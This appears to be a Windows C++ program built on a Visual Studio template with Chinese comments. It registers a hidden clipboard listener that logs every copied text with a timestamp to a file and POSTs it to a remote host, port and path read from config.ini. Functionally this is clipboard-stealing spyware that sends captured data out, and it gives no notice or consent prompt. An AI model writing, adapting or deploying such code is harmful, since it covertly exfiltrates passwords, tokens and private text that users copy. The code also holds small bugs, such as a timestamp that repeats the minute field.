﻿// Project2.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Project2.h"
#include "stdio.h"
#include "winhttp.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
HWND                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: 在此处放置代码。

	// 初始化全局字符串
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_PROJECT2, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化:
	HWND hWnd = InitInstance(hInstance, nCmdShow);

	AddClipboardFormatListener(hWnd);
	MSG msg;

	// 主消息循环:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int)msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PROJECT2));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_PROJECT2);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
HWND InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // 将实例句柄存储在全局变量中

	return CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
}

void clipBoadProc() {
	OpenClipboard(nullptr);
	HGLOBAL  handle = GetClipboardData(CF_UNICODETEXT);

	LPCWSTR str = (LPCWSTR)GlobalLock(handle);
	//begin
	//MessageBoxW(nullptr, str, nullptr, 0);
	FILE* file;
	wchar_t filename[1024] = { 0 };
	GetPrivateProfileString(L"main", L"filename", nullptr, filename, sizeof(filename), L".\\config.ini");

	wchar_t host[1024] = { 0 };
	GetPrivateProfileString(L"main", L"host", nullptr, host, sizeof(host), L".\\config.ini");

	wchar_t path[1024] = { 0 };
	GetPrivateProfileString(L"main", L"path", L"/", path, sizeof(host), L".\\config.ini");

	_tfopen_s(&file, filename, L"a");

	int port = GetPrivateProfileInt(L"main", L"port", 80, L".\\config.ini");

	char buf[256] = { 0 };
	if (str) {
		WideCharToMultiByte(CP_ACP, 0, str, wcslen(str) + 1, buf, 256, NULL, NULL);
	}

	if (file && str) {

		SYSTEMTIME tm;
		GetLocalTime(&tm);
		char timeBuf[64] = { 0 };
		sprintf_s(timeBuf, sizeof(timeBuf), "[%d-%d-%d %d:%d:%d] ", tm.wYear, tm.wMonth, tm.wDay, tm.wHour, tm.wMinute, tm.wMinute);
		fwrite(timeBuf, strlen(timeBuf), 1, file);
		fwrite(buf, sizeof(char), strlen(buf), file);
		char rt = '\n';
		fwrite(&rt, sizeof(char), 1, file);
		file&& fclose(file);
	}

	if (host && str) {
		auto hSession = WinHttpOpen(L"vc++", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		auto hConn = WinHttpConnect(hSession, host, port, 0);
		auto hReq = WinHttpOpenRequest(hConn, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
		auto result = WinHttpSendRequest(hReq,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			(LPVOID*)buf, strlen(buf), strlen(buf), 0);
		hReq&& WinHttpCloseHandle(hReq);
		hConn&& WinHttpCloseHandle(hConn);
		hSession&& WinHttpCloseHandle(hSession);
	}



	//end	
	GlobalUnlock(handle);
	CloseClipboard();
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLIPBOARDUPDATE:
		clipBoadProc();
		break;
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		// 分析菜单选择:
		switch (wmId)
		{
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: 在此处添加使用 hdc 的任何绘图代码...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}
